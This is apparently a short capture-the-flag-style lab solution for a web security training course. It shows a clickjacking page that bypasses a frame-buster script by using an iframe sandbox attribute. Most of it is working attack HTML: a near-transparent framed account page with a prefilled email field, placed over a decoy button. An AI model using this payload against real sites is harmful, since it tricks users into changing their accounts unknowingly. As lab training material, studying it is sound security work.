# Lab: Clickjacking with a frame buster script

Same as before, but with sandbox attribute:
`<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`

```
<style>
    iframe {
        position:relative;
        width:700px;
        height:600px;
        opacity:0.0001;
        z-index:2;
        }
    div {
        position:absolute;
        top:500px;
        left:60px;
        z-index:1;
        }
</style>
<div>Click me</div>
<iframe src="https://ac2b1f7b1e4cc191c021235a00cf0018.web-security-academy.net/my-account?email=bad@bad.com" sandbox="allow-forms"></iframe>
```